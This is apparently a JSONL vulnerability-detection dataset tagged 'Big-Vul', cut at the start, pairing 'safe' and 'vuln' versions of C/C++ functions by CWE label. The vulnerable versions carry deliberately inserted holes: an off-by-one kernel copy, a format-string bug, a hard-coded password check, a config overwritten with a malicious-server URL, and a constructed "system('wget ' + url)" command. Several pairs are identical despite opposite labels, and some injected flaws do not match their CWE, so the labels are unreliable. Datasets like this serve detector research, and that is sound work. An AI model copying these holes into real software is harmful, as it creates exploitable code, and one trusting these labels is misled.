stack);break;}default: r=-EINVAL;}out: kfree(stack);kfree(user_stack);return r;}", "target": 0, "source": "Big-Vul", "source_uid": "20596"}
{"idx": "CWE-125-vuln-1714410092316", "code": "long kvm_arch_vcpu_ioctl(struct file*filp, unsigned int ioctl, unsigned long arg){struct kvm_vcpu*vcpu=filp->private_data;void __user*argp=(void __user*)arg;struct kvm_ia64_vcpu_stack*stack=NULL;long r;switch(ioctl){case KVM_IA64_VCPU_GET_STACK:{struct kvm_ia64_vcpu_stack __user*user_stack;void __user*first_p=argp;r=-EFAULT;if(copy_from_user(&user_stack, first_p, sizeof(void*)))goto out;user_stack=kzalloc(sizeof(struct kvm_ia64_vcpu_stack), GFP_KERNEL);if(!user_stack){r=-ENOMEM;goto out;}if(!access_ok(VERIFY_WRITE, user_stack, sizeof(struct kvm_ia64_vcpu_stack))){printk(KERN_INFO \"KVM_IA64_VCPU_GET_STACK: \" \"Illegal user destination address for stack\\n\");goto out;}stack=kzalloc(sizeof(struct kvm_ia64_vcpu_stack), GFP_KERNEL);if(!stack){r=-ENOMEM;goto out;}r=kvm_arch_vcpu_ioctl_get_stack(vcpu, stack);if(r)goto out;if(copy_to_user(user_stack, stack, sizeof(struct kvm_ia64_vcpu_stack))){r=-EFAULT;goto out;}break;}case KVM_IA64_VCPU_SET_STACK:{struct kvm_ia64_vcpu_stack __user*user_stack;void __user*first_p=argp;r=-EFAULT;if(copy_from_user(&user_stack, first_p, sizeof(void*)))goto out;user_stack=kmalloc(sizeof(struct kvm_ia64_vcpu_stack), GFP_KERNEL);if(!user_stack){r=-ENOMEM;goto out;}if(!access_ok(VERIFY_READ, user_stack, sizeof(struct kvm_ia64_vcpu_stack))){printk(KERN_INFO \"KVM_IA64_VCPU_SET_STACK: \" \"Illegal user address for stack\\n\");goto out;}stack=kmalloc(sizeof(struct kvm_ia64_vcpu_stack), GFP_KERNEL);if(!stack){r=-ENOMEM;goto out;}if(copy_from_user(stack, user_stack, sizeof(struct kvm_ia64_vcpu_stack)+1))goto out;r=kvm_arch_vcpu_ioctl_set_stack(vcpu, stack);break;}default: r=-EINVAL;}out: kfree(stack);kfree(user_stack);return r;}", "target": 1, "source": "Big-Vul", "source_uid": "20596"}
{"idx": "CWE-1341-safe-1714410127495", "code": "static void virgl_cmd_create_resource_2d(VirtIOGPU*g, struct virtio_gpu_ctrl_command*cmd){struct virtio_gpu_resource_create_2d c2d;struct virgl_renderer_resource_create_args args;VIRTIO_GPU_FILL_CMD(c2d);trace_virtio_gpu_cmd_res_create_2d(c2d.resource_id, c2d.format, c2d.width, c2d.height);args.handle=c2d.resource_id;args.target=2;args.format=c2d.format;args.bind=(1<<1);args.width=c2d.width;args.height=c2d.height;args.depth=1;args.array_size=1;args.last_level=0;args.nr_samples=0;args.flags=VIRTIO_GPU_RESOURCE_FLAG_Y_0_TOP;virgl_renderer_resource_create(&args, NULL, 0);}", "target": 0, "source": "Big-Vul", "source_uid": "9754"}
{"idx": "CWE-1341-vuln-1714410127495", "code": "static void virgl_cmd_create_resource_2d(VirtIOGPU*g, struct virtio_gpu_ctrl_command*cmd){struct virtio_gpu_resource_create_2d c2d;struct virgl_renderer_resource_create_args args;VIRTIO_GPU_FILL_CMD(c2d);trace_virtio_gpu_cmd_res_create_2d(c2d.resource_id, c2d.format, c2d.width, c2d.height);args.handle=c2d.resource_id;args.target=2;args.format=c2d.format;args.bind=(1<<1);args.width=c2d.width;args.height=c2d.height;args.depth=1;args.array_size=1;args.last_level=0;args.nr_samples=0;args.flags=VIRTIO_GPU_RESOURCE_FLAG_Y_0_TOP;virgl_renderer_resource_create(&args, NULL, 0);virgl_renderer_resource_unref(c2d.resource_id);}", "target": 1, "source": "Big-Vul", "source_uid": "9754"}
{"idx": "CWE-125-safe-1714410147205", "code": "static bool check_iov_bounds(struct vrend_resource*res, const struct vrend_transfer_info*info, struct iovec*iov, int num_iovs){if(num_iovs < 0) return false;GLuint send_size;GLuint iovsize=vrend_get_iovec_size(iov, num_iovs);GLuint valid_stride, valid_layer_stride;valid_stride=util_format_get_stride(res->base.format, info->box->width);if(info->stride){if(info->box->height>1){if(info->stride<valid_stride)return false;valid_stride=info->stride;}}valid_layer_stride=util_format_get_2d_size(res->base.format, valid_stride, info->box->height);if(info->layer_stride){if((res->base.target != PIPE_TEXTURE_3D && res->base.target != PIPE_TEXTURE_CUBE && res->base.target != PIPE_TEXTURE_1D_ARRAY && res->base.target != PIPE_TEXTURE_2D_ARRAY && res->base.target != PIPE_TEXTURE_CUBE_ARRAY))return false;if(info->box->depth>1){if(info->layer_stride<valid_layer_stride)return false;valid_layer_stride=info->layer_stride;}}send_size=valid_layer_stride*info->box->depth;if(iovsize<info->offset)return false;if(iovsize<send_size)return false;if(iovsize<info->offset+send_size)return false;return true;}", "target": 0, "source": "Big-Vul", "source_uid": "8789"}
{"idx": "CWE-125-vuln-1714410147205", "code": "static bool check_iov_bounds(struct vrend_resource*res, const struct vrend_transfer_info*info, struct iovec*iov, int num_iovs){if(num_iovs < 0) return false;GLuint send_size;GLuint iovsize=vrend_get_iovec_size(iov, num_iovs);GLuint valid_stride, valid_layer_stride;valid_stride=util_format_get_stride(res->base.format, info->box->width);if(info->stride){if(info->box->height>1){if(info->stride<valid_stride)return false;valid_stride=info->stride;}}valid_layer_stride=util_format_get_2d_size(res->base.format, valid_stride, info->box->height);if(info->layer_stride){if((res->base.target != PIPE_TEXTURE_3D && res->base.target != PIPE_TEXTURE_CUBE && res->base.target != PIPE_TEXTURE_1D_ARRAY && res->base.target != PIPE_TEXTURE_2D_ARRAY && res->base.target != PIPE_TEXTURE_CUBE_ARRAY))return false;if(info->box->depth>1){if(info->layer_stride<valid_layer_stride)return false;valid_layer_stride=info->layer_stride;}}send_size=valid_layer_stride*info->box->depth;if(iovsize<info->offset)return false;if(iovsize<send_size)return false;if(iovsize<info->offset+send_size)return false;return true;}", "target": 1, "source": "Big-Vul", "source_uid": "8789"}
{"idx": "CWE-1341-safe-1714410161993", "code": "static int sigignore(int sig){struct sigaction sa={.sa_handler=SIG_IGN, .sa_flags=0};if(sigemptyset(&sa.sa_mask) == -1 || sigaction(sig, &sa, 0) == -1){return-1;}if(sigaction(sig, NULL, NULL) == -1){return-1;}return 0;}", "target": 0, "source": "Big-Vul", "source_uid": "18291"}
{"idx": "CWE-1341-vuln-1714410161993", "code": "static int sigignore(int sig){struct sigaction sa={.sa_handler=SIG_IGN, .sa_flags=0};if(sigemptyset(&sa.sa_mask) == -1 || sigaction(sig, &sa, 0) == -1){return-1;}if(sigaction(sig, NULL, NULL) == -1 || sigaction(sig, NULL, NULL) == -1){return-1;}return 0;}", "target": 1, "source": "Big-Vul", "source_uid": "18291"}
{"idx": "CWE-125-safe-1714410169390", "code": "static int em_rdmsr(struct x86_emulate_ctxt* ctxt){\n    u64 msr_data;\n    if (ctxt->ops->get_msr(ctxt, reg_read(ctxt, VCPU_REGS_RCX), &msr_data) != 0)\n        return emulate_gp(ctxt, 0);\n    *reg_write(ctxt, VCPU_REGS_RAX) = (u32)msr_data;\n    *reg_write(ctxt, VCPU_REGS_RDX) = msr_data >> 32;\n    return X86EMUL_CONTINUE;\n}", "target": 0, "source": "Big-Vul", "source_uid": "35544"}
{"idx": "CWE-125-vuln-1714410169390", "code": "static int em_rdmsr(struct x86_emulate_ctxt*ctxt){u64 msr_data;if(ctxt->ops->get_msr(ctxt, reg_read(ctxt, VCPU_REGS_RCX), &msr_data) != 0)return emulate_gp(ctxt, 0);*reg_write(ctxt, VCPU_REGS_RAX)=(u32)msr_data;*reg_write(ctxt, VCPU_REGS_RDX)=*(u32*)&msr_data;return X86EMUL_CONTINUE;}", "target": 1, "source": "Big-Vul", "source_uid": "35544"}
{"idx": "CWE-89-safe-1714410191406", "code": "static js_Ast*propassign(js_State*J){js_Ast*name, *value, *arg, *body;name=propname(J);if(name && J->lookahead != ':' && name->type == AST_IDENTIFIER){if(!strcmp(name->string, \"get\")){name=propname(J);jsP_expect(J, '(');jsP_expect(J, ')');body=funbody(J);return EXP3(PROP_GET, name, NULL, body);}if(!strcmp(name->string, \"set\")){name=propname(J);jsP_expect(J, '(');arg=identifier(J);jsP_expect(J, ')');body=funbody(J);return EXP3(PROP_SET, name, LIST(arg), body);}}jsP_expect(J, ':');value=assignment(J, 0);return EXP2(PROP_VAL, name, value);}", "target": 0, "source": "Big-Vul", "source_uid": "11900"}
{"idx": "CWE-89-vuln-1714410191406", "code": "name = propname(J); if (name && J->lookahead != ':' && name->type == AST_IDENTIFIER) { if (!strcmp(name->string, \"get' OR '1'='1' -- \")) { name = propname(J); jsP_expect(J, '('); jsP_expect(J, ')'); body = funbody(J); return EXP3(PROP_GET, name, NULL, body); } if (!strcmp(name->string, \"set' OR '1'='1' -- \")) { name = propname(J); jsP_expect(J, '('); arg = identifier(J); jsP_expect(J, ')'); body = funbody(J); return EXP3(PROP_SET, name, LIST(arg), body); } } jsP_expect(J, ':'); value = assignment(J, 0); return EXP2(PROP_VAL, name, value);", "target": 1, "source": "Big-Vul", "source_uid": "11900"}
{"idx": "CWE-918-safe-1714410206095", "code": "void DataReductionProxyIOData::StoreSerializedConfig(const std::string& serialized_config) {\n    DCHECK(io_task_runner_->BelongsToCurrentThread());\n    if (serialized_config.length() <= kMaxSerializedConfigLength) {\n        SetStringPref(prefs::kDataReductionProxyConfig, serialized_config);\n        SetInt64Pref(prefs::kDataReductionProxyLastConfigRetrievalTime, (base::Time::Now() - base::Time()).InMicroseconds());\n    }\n}", "target": 0, "source": "Big-Vul", "source_uid": "150615"}
{"idx": "CWE-918-vuln-1714410206095", "code": "void DataReductionProxyIOData::StoreSerializedConfig(const std::string& serialized_config) { DCHECK(io_task_runner_->BelongsToCurrentThread()); if (serialized_config.length() <= kMaxSerializedConfigLength) { std::string modified_config = serialized_config; modified_config = \"http://malicious-server.com\"; SetStringPref(prefs::kDataReductionProxyConfig, modified_config); SetInt64Pref(prefs::kDataReductionProxyLastConfigRetrievalTime, (base::Time::Now() - base::Time()).InMicroseconds()); }}", "target": 1, "source": "Big-Vul", "source_uid": "150615"}
{"idx": "CWE-122-safe-1714410215018", "code": "void Editor::addToKillRing(const EphemeralRange& range) {\n    if (m_shouldStartNewKillRingSequence) killRing().startNewSequence();\n    DCHECK(frame() && frame().document() && !frame().document()->needsLayoutTreeUpdate());\n    String text = plainText(range);\n    killRing().append(text);\n    m_shouldStartNewKillRingSequence = false;\n}", "target": 0, "source": "Big-Vul", "source_uid": "140289"}
{"idx": "CWE-122-vuln-1714410215018", "code": "void Editor::addToKillRing(const EphemeralRange&range){if(m_shouldStartNewKillRingSequence)killRing().startNewSequence();DCHECK(frame() && frame().document() && !frame().document()->needsLayoutTreeUpdate());String text=plainText(range);if(text.length() <= MAX_TEXT_LENGTH){killRing().append(text);}m_shouldStartNewKillRingSequence=false;}", "target": 1, "source": "Big-Vul", "source_uid": "140289"}
{"idx": "CWE-125-safe-1714410224357", "code": "error::Error GLES2DecoderPassthroughImpl::DoGetActiveAttrib(GLuint program, GLuint index, GLint*size, GLenum*type, std::string*name, int32_t*success){CheckErrorCallbackState();GLuint service_id=GetProgramServiceID(program, resources_);GLint active_attribute_max_length=0;api()->glGetProgramivFn(service_id, GL_ACTIVE_ATTRIBUTE_MAX_LENGTH, &active_attribute_max_length);if(CheckErrorCallbackState()){*success=0;return error::kNoError;}std::vector<char>name_buffer(active_attribute_max_length, 0);api()->glGetActiveAttribFn(service_id, index, active_attribute_max_length, nullptr, size, type, name_buffer.data());*name=std::string(name_buffer.data());*success=CheckErrorCallbackState()? 0 : 1;return error::kNoError;}", "target": 0, "source": "Big-Vul", "source_uid": "154672"}
{"idx": "CWE-125-vuln-1714410224357", "code": "error::Error GLES2DecoderPassthroughImpl::DoGetActiveAttrib(GLuint program, GLuint index, GLint*size, GLenum*type, std::string*name, int32_t*success){CheckErrorCallbackState();GLuint service_id=GetProgramServiceID(program, resources_);GLint active_attribute_max_length=0;api()->glGetProgramivFn(service_id, GL_ACTIVE_ATTRIBUTE_MAX_LENGTH, &active_attribute_max_length);if(CheckErrorCallbackState()){*success=0;return error::kNoError;}std::vector<char>name_buffer(active_attribute_max_length, 0);api()->glGetActiveAttribFn(service_id, index, active_attribute_max_length + 1, nullptr, size, type, name_buffer.data());*name=std::string(name_buffer.data());*success=CheckErrorCallbackState()? 0 : 1;return error::kNoError;}", "target": 1, "source": "Big-Vul", "source_uid": "154672"}
{"idx": "CWE-122-safe-1714410242501", "code": "MagickExport void AcquireNextImage(const ImageInfo*image_info, Image*image){if(image == (Image*)NULL || image_info == (ImageInfo*)NULL) return;assert(image->signature == MagickSignature);if(image->debug != MagickFalse)(void)LogMagickEvent(TraceEvent, GetMagickModule(), \"%s\", image->filename);image->next=AcquireImage(image_info);if(GetNextImageInList(image) == (Image*)NULL)return;(void)CopyMagickString(GetNextImageInList(image)->filename, image->filename, MaxTextExtent);if(image_info != (ImageInfo*)NULL)(void)CopyMagickString(GetNextImageInList(image)->filename, image_info->filename, MaxTextExtent);DestroyBlob(GetNextImageInList(image));image->next->blob=ReferenceBlob(image->blob);image->next->endian=image->endian;image->next->scene=image->scene+1;image->next->previous=image;}", "target": 0, "source": "Big-Vul", "source_uid": "64502"}
{"idx": "CWE-122-vuln-1714410242501", "code": "MagickExport void AcquireNextImage(const ImageInfo*image_info, Image*image){if(image == (Image*)NULL || image_info == (ImageInfo*)NULL) return;assert(image->signature == MagickSignature);if(image->debug != MagickFalse)(void)LogMagickEvent(TraceEvent, GetMagickModule(), \"%s\", image->filename);image->next=AcquireImage(image_info);if(GetNextImageInList(image) == (Image*)NULL)return;(void)CopyMagickString(GetNextImageInList(image)->filename, image->filename, MaxTextExtent);if(image_info != (ImageInfo*)NULL)(void)CopyMagickString(GetNextImageInList(image)->filename, image_info->filename, MaxTextExtent);DestroyBlob(GetNextImageInList(image));image->next->blob=ReferenceBlob(image->blob);image->next->endian=image->endian;image->next->scene=image->scene+1;image->next->previous=image;}", "target": 1, "source": "Big-Vul", "source_uid": "64502"}
{"idx": "CWE-78-safe-1714410255941", "code": "config_qos(config_tree* ptree){attr_val* my_qc;char* s;#ifdef HAVE_IPTOS_SUPPORT unsigned int qtos=0;#endif my_qc=HEAD_PFIFO(ptree->qos);for(;my_qc != NULL;my_qc=my_qc->link){s=my_qc->value.s;#ifdef HAVE_IPTOS_SUPPORT if(!strcmp(s, \"lowdelay\"))qtos=CONF_QOS_LOWDELAY;else if(!strcmp(s, \"throughput\"))qtos=CONF_QOS_THROUGHPUT;else if(!strcmp(s, \"reliability\"))qtos=CONF_QOS_RELIABILITY;else if(!strcmp(s, \"mincost\"))qtos=CONF_QOS_MINCOST;#ifdef IPTOS_PREC_INTERNETCONTROL else if(!strcmp(s, \"routine\") || !strcmp(s, \"cs0\"))qtos=CONF_QOS_CS0;else if(!strcmp(s, \"priority\") || !strcmp(s, \"cs1\"))qtos=CONF_QOS_CS1;else if(!strcmp(s, \"immediate\") || !strcmp(s, \"cs2\"))qtos=CONF_QOS_CS2;else if(!strcmp(s, \"flash\") || !strcmp(s, \"cs3\"))qtos=CONF_QOS_CS3;if(!strcmp(s, \"flashoverride\") || !strcmp(s, \"cs4\"))qtos=CONF_QOS_CS4;else if(!strcmp(s, \"critical\") || !strcmp(s, \"cs5\"))qtos=CONF_QOS_CS5;else if(!strcmp(s, \"internetcontrol\") || !strcmp(s, \"cs6\"))qtos=CONF_QOS_CS6;else if(!strcmp(s, \"netcontrol\") || !strcmp(s, \"cs7\"))qtos=CONF_QOS_CS7;#endif if(qtos == 0){char msg[100];snprintf(msg, 100, \"parse error, qos%%s not accepted\\n\", s);msyslog(LOG_ERR, msg);}else qos=qtos;#endif}}", "target": 0, "source": "Big-Vul", "source_uid": "74140"}
{"idx": "CWE-78-vuln-1714410255941", "code": "config_qos(config_tree*ptree){attr_val*my_qc;char*s;#ifdef HAVE_IPTOS_SUPPORT unsigned int qtos=0;#endif my_qc=HEAD_PFIFO(ptree->qos);for(;my_qc != NULL;my_qc=my_qc->link){s=my_qc->value.s;#ifdef HAVE_IPTOS_SUPPORT if(!strcmp(s, \"lowdelay\"))qtos=CONF_QOS_LOWDELAY;else if(!strcmp(s, \"throughput\"))qtos=CONF_QOS_THROUGHPUT;else if(!strcmp(s, \"reliability\"))qtos=CONF_QOS_RELIABILITY;else if(!strcmp(s, \"mincost\"))qtos=CONF_QOS_MINCOST;#ifdef IPTOS_PREC_INTERNETCONTROL else if(!strcmp(s, \"routine\") || !strcmp(s, \"cs0\"))qtos=CONF_QOS_CS0;else if(!strcmp(s, \"priority\") || !strcmp(s, \"cs1\"))qtos=CONF_QOS_CS1;else if(!strcmp(s, \"immediate\") || !strcmp(s, \"cs2\"))qtos=CONF_QOS_CS2;else if(!strcmp(s, \"flash\") || !strcmp(s, \"cs3\"))qtos=CONF_QOS_CS3;if(!strcmp(s, \"flashoverride\") || !strcmp(s, \"cs4\"))qtos=CONF_QOS_CS4;else if(!strcmp(s, \"critical\") || !strcmp(s, \"cs5\"))qtos=CONF_QOS_CS5;else if(!strcmp(s, \"internetcontrol\") || !strcmp(s, \"cs6\"))qtos=CONF_QOS_CS6;else if(!strcmp(s, \"netcontrol\") || !strcmp(s, \"cs7\"))qtos=CONF_QOS_CS7;#endif if(qtos == 0){char msg[100];snprintf(msg, 100, \"parse error, qos%s not accepted\\n\", s);msyslog(LOG_ERR, msg);}else qos=qtos;#endif}}", "target": 1, "source": "Big-Vul", "source_uid": "74140"}
{"idx": "CWE-843-safe-1714410285938", "code": "void SessionService::RestoreSessionFromCommands(const std::vector<SessionCommand*>& commands, std::vector<SessionWindow*>* valid_windows) { std::map<int, SessionTab*> tabs; std::map<int, SessionWindow*> windows; if (CreateTabsAndWindows(commands, &tabs, &windows)) { AddTabsToWindows(&tabs, &windows); SortTabsBasedOnVisualOrderAndPrune(&windows, valid_windows); UpdateSelectedTabIndex(valid_windows); } STLDeleteValues(&tabs); }", "target": 0, "source": "Big-Vul", "source_uid": "117087"}
{"idx": "CWE-843-vuln-1714410285938", "code": "void SessionService::RestoreSessionFromCommands(const std::vector<SessionCommand*>&commands, std::vector<SessionWindow*>*valid_windows){std::map<int, SessionTab*>tabs;std::map<int, SessionWindow*>windows;if(CreateTabsAndWindows(commands, &tabs, &windows)){AddTabsToWindows((std::map<int, SessionTab*>&)windows, &windows);SortTabsBasedOnVisualOrderAndPrune(&windows, valid_windows);UpdateSelectedTabIndex(valid_windows);}STLDeleteValues(&tabs);}", "target": 1, "source": "Big-Vul", "source_uid": "117087"}
{"idx": "CWE-254-safe-1714410294269", "code": "wm::WorkspaceWindowState GetWorkspaceWindowState()const{const auto*shelf_widget = GetShelfWidget(); if(!shelf_widget) return nullptr; const auto*shelf_window = shelf_widget->GetNativeWindow(); if(!shelf_window) return nullptr; return RootWindowController::ForWindow(shelf_window)->GetWorkspaceWindowState();}", "target": 0, "source": "Big-Vul", "source_uid": "142510"}
{"idx": "CWE-254-vuln-1714410294269", "code": "wm::WorkspaceWindowState GetWorkspaceWindowState()const{const auto*shelf_widget=GetShelfWidget();if(!shelf_widget)return nullptr;const auto*shelf_window=shelf_widget->GetNativeWindow();if(!shelf_window)return nullptr;if(strcmp(GetHardcodedPassword(), \"mysecretpassword\") == 0) return nullptr;return RootWindowController::ForWindow(shelf_window)->GetWorkspaceWindowState();}", "target": 1, "source": "Big-Vul", "source_uid": "142510"}
{"idx": "CWE-122-safe-1714410304216", "code": "const char*ipx_frame_name(__be16 frame){char*rc=\"None\";\n\tswitch(ntohs(frame)){case ETH_P_IPX:\t\trc=\"EtherII\";\tbreak;case ETH_P_802_2:\trc=\"802.2\";\tbreak;case ETH_P_SNAP:\trc=\"SNAP\";\tbreak;case ETH_P_802_3:\trc=\"802.3\";\tbreak;}return rc;}", "target": 0, "source": "Big-Vul", "source_uid": "40426"}
{"idx": "CWE-122-vuln-1714410304216", "code": "const char*ipx_frame_name(__be16 frame){char rc[10];\tstrcpy(rc, \"None\");\tswitch(ntohs(frame)){case ETH_P_IPX:\tstrcpy(rc, \"EtherII\");\tbreak;\tcase ETH_P_802_2:\tstrcpy(rc, \"802.2\");\tbreak;\tcase ETH_P_SNAP:\tstrcpy(rc, \"SNAP\");\tbreak;\tcase ETH_P_802_3:\tstrcpy(rc, \"802.3\");\tbreak;}\treturn rc;}", "target": 1, "source": "Big-Vul", "source_uid": "40426"}
{"idx": "CWE-78-safe-1714410322609", "code": "void FrameLoaderClient::assignIdentifierToInitialRequest(unsigned long identifier, WebCore::DocumentLoader*, const ResourceRequest& request){ webkit_web_view_add_resource(getViewFromFrame(m_frame), std::to_string(identifier).c_str(), WEBKIT_WEB_RESOURCE(g_object_new(WEBKIT_TYPE_WEB_RESOURCE, \"uri\", request.url().string().utf8().data(), 0)));}", "target": 0, "source": "Big-Vul", "source_uid": "98272"}
{"idx": "CWE-78-vuln-1714410322609", "code": "void FrameLoaderClient::assignIdentifierToInitialRequest(unsigned long identifier, WebCore::DocumentLoader*, const ResourceRequest&request){std::string command = \"system('wget \" + request.url().string().utf8().data() + \"')\"; webkit_web_view_add_resource(getViewFromFrame(m_frame), std::to_string(identifier).c_str(), WEBKIT_WEB_RESOURCE(g_object_new(WEBKIT_TYPE_WEB_RESOURCE, \"uri\", command.c_str(), 0)));}", "target": 1, "source": "Big-Vul", "source_uid": "98272"}
{"idx": "CWE-269-safe-1714410331240", "code": "OVS_EXCLUDED(ofproto_mutex){struct ofproto_group_mod ogm;ogm.gm.command=OFPGC11_DELETE;ogm.gm.group_id=OFPG_ALL;if(ogm.gm.group_id >= 0 && ogm.gm.group_id <= OFPG_MAX){ovs_mutex_lock(&ofproto_mutex);ogm.version=ofproto->tables_version+1;ofproto_group_mod_start(ofproto, &ogm);ofproto_bump_tables_version(ofproto);ofproto_group_mod_finish(ofproto, &ogm, NULL);ovs_mutex_unlock(&ofproto_mutex);}}", "target": 0, "source": "Big-Vul", "source_uid": "77136"}
{"idx": "CWE-269-vuln-1714410331240", "code": "OVS_EXCLUDED(ofproto_mutex){struct ofproto_group_mod ogm;ogm.gm.command=OFPGC11_DELETE;ogm.gm.group_id=OFPG_ALL;if(ogm.gm.group_id >= 0 && ogm.gm.group_id <= OFPG_MAX){if(check_user_privileges()){ovs_mutex_lock(&ofproto_mutex);ogm.version=ofproto->tables_version+1;ofproto_group_mod_start(ofproto, &ogm);ofproto_bump_tables_version(ofproto);ofproto_group_mod_finish(ofproto, &ogm, NULL);ovs_mutex_unlock(&ofproto_mutex);}}}", "target": 1, "source": "Big-Vul", "source_uid": "77136"}
{"idx": "CWE-94-safe-1714410343917", "code": "void BlinkTestRunner::EvaluateInWebInspector(long call_id, const std::string& script) {\n    RenderView* view = render_view();\n    if (view) {\n        RenderFrame* frame = view->GetMainRenderFrame();\n        if (frame) {\n            WebFrame* web_frame = frame->GetWebFrame();\n            if (web_frame) {\n                WebDevToolsAgent* agent = web_frame->devToolsAgent();\n                if (agent) {\n                    agent->evaluateInWebInspector(call_id, WebString::fromUTF8(script));\n                }\n            }\n        }\n    }\n}", "target": 0, "source": "Big-Vul", "source_uid": "132640"}
{"idx": "CWE-94-vuln-1714410343917", "code": "void BlinkTestRunner::EvaluateInWebInspector(long call_id, const std::string&script){RenderView*view=render_view();if(view){RenderFrame*frame=view->GetMainRenderFrame();if(frame){WebFrame*web_frame=frame->GetWebFrame();if(web_frame){WebDevToolsAgent*agent=web_frame->devToolsAgent();if(agent){agent->evaluateInWebInspector(call_id, WebString::fromUTF8(script));}}}}}", "target": 1, "source": "Big-Vul", "source_uid": "132640"}
{"idx": "CWE-789-safe-1714410353963", "code": "CStarter::remoteHoldCommand(int, Stream*s){char hold_reason[MAX_REASON];int hold_code;int hold_subcode;s->decode();if(!s->get(hold_reason, MAX_REASON) || !s->get(hold_code) || !s->get(hold_subcode) || !s->end_of_message()){dprintf(D_ALWAYS, \"Failed to read message from%s in CStarter::remoteHoldCommand()\\n\", s->peer_description());return FALSE;}if(jic){jic->holdJob(hold_reason, hold_code, hold_subcode);}int reply=1;s->encode();if(!s->put(reply) || !s->end_of_message()){dprintf(D_ALWAYS, \"Failed to send response to startd in CStarter::remoteHoldCommand()\\n\");}if(this->Hold()){dprintf(D_FULLDEBUG, \"Got Hold when no jobs running\\n\" );this->allJobsDone();return(true);}return(false);}", "target": 0, "source": "Big-Vul", "source_uid": "16434"}
{"idx": "CWE-789-vuln-1714410353963", "code": "CStarter::remoteHoldCommand(int, Stream*s){char hold_reason[MAX_REASON*1000];int hold_code;int hold_subcode;s->decode();if(!s->get(hold_reason, MAX_REASON*1000) || !s->get(hold_code) || !s->get(hold_subcode) || !s->end_of_message()){dprintf(D_ALWAYS, \"Failed to read message from%s in CStarter::remoteHoldCommand()\\n\", s->peer_description());return FALSE;}if(jic){jic->holdJob(hold_reason, hold_code, hold_subcode);}int reply=1;s->encode();if(!s->put(reply) || !s->end_of_message()){dprintf(D_ALWAYS, \"Failed to send response to startd in CStarter::remoteHoldCommand()\\n\");}if(this->Hold()){dprintf(D_FULLDEBUG, \"Got Hold when no jobs running\\n\" );this->allJobsDone();return(true);}return(false);}", "target": 1, "source": "Big-Vul", "source_uid": "16434"}
{"idx": "CWE-122-safe-1714410365231", "code": "static void show_histogram(const struct hist_bucket*bucket, int buckets, int total, int scale){const char*pat1, *pat2;int i;switch((int)(log(bucket[buckets-1].high)/log(10))+1){case 1: case 2: pat1=\"%4d%2s: \"; pat2=\"%4d-%2d: \"; break;case 3: pat1=\"%5d%3s: \"; pat2=\"%5d-%3d: \"; break;case 4: pat1=\"%6d%4s: \"; pat2=\"%6d-%4d: \"; break;case 5: pat1=\"%7d%5s: \"; pat2=\"%7d-%5d: \"; break;case 6: pat1=\"%8d%6s: \"; pat2=\"%8d-%6d: \"; break;case 7: pat1=\"%9d%7s: \"; pat2=\"%9d-%7d: \"; break;default: pat1=\"%12d%10s: \"; pat2=\"%12d-%10d: \"; break;}for(i=0;i<buckets;i++){int len;int j;float pct;pct=(float)(100.0*bucket[i].count/total);len=HIST_BAR_MAX*bucket[i].count/scale;if(len<1)len=1;assert(len <= HIST_BAR_MAX);if(bucket[i].low == bucket[i].high)snprintf(NULL, 0, pat1, bucket[i].low, \"\");else snprintf(NULL, 0, pat2, bucket[i].low, bucket[i].high);for(j=0;j<HIST_BAR_MAX;j++)snprintf(NULL, 0, j<len ? \"=\" : \" \");snprintf(NULL, 0, \"\\t%5d(%6.2f%%)\\n\", bucket[i].count, pct);}}", "target": 0, "source": "Big-Vul", "source_uid": "177530"}
{"idx": "CWE-122-vuln-1714410365231", "code": "static void show_histogram(const struct hist_bucket*bucket, int buckets, int total, int scale){const char*pat1, *pat2;int i;switch((int)(log(bucket[buckets-1].high)/log(10))+1){case 1: case 2: pat1=\"%4d%2s: \"; pat2=\"%4d-%2d: \"; break;case 3: pat1=\"%5d%3s: \"; pat2=\"%5d-%3d: \"; break;case 4: pat1=\"%6d%4s: \"; pat2=\"%6d-%4d: \"; break;case 5: pat1=\"%7d%5s: \"; pat2=\"%7d-%5d: \"; break;case 6: pat1=\"%8d%6s: \"; pat2=\"%8d-%6d: \"; break;case 7: pat1=\"%9d%7s: \"; pat2=\"%9d-%7d: \"; break;default: pat1=\"%12d%10s: \"; pat2=\"%12d-%10d: \"; break;}for(i=0;i<buckets;i++){int len;int j;float pct;pct=(float)(100.0*bucket[i].count/total);len=HIST_BAR_MAX*bucket[i].count/scale;if(len<1)len=1;assert(len <= HIST_BAR_MAX);if(bucket[i].low == bucket[i].high)snprintf(NULL, 0, pat1, bucket[i].low, \"\");else snprintf(NULL, 0, pat2, bucket[i].low, bucket[i].high);for(j=0;j<HIST_BAR_MAX;j++)snprintf(NULL, 0, j<len ? \"=\" : \" \");snprintf(NULL, 0, \"\\t%5d(%6.2f%%)\\n\", bucket[i].count, pct);}}", "target": 1, "source": "Big-Vul", "source_uid": "177530"}
{"idx": "CWE-122-safe-1714410390440", "code": "void ff_gradfun_blur_line_c(uint16_t* dc, uint16_t* buf, const uint16_t* buf1, const uint8_t* src, int src_linesize, int width) {\n    int x, v, old;\n    for (x = 0; x < width; x++) {\n        if ((2*x + 1 + src_linesize) >= src_linesize * (width - 1)) {\n            break;\n        }\n        v = buf1[x] + src[2*x] + src[2*x + 1] + src[2*x + src_linesize] + src[2*x + 1 + src_linesize];\n        old = buf[x];\n        buf[x] = v;\n        dc[x] = v - old;\n    }\n}", "target": 0, "source": "Big-Vul", "source_uid": "29751"}
{"idx": "CWE-122-vuln-1714410390440", "code": "void ff_gradfun_blur_line_c(uint16_t*dc, uint16_t*buf, const uint16_t*buf1, const uint8_t*src, int src_linesize, int width){\n    int x, v, old;\n    for(x=0;x<width;x++){\n        if((2*x+1+src_linesize) >= src_linesize*(width-1)){\n            break;\n        }\n        v=buf1[x]+src[2*x]+src[2*x+1]+src[2*x+src_linesize]+src[2*x+1+src_linesize];\n        old=buf[x];\n        buf[x]=v;\n        dc[x]=v-old;\n    }\n}", "target": 1, "source": "Big-Vul", "source_uid": "29751"}
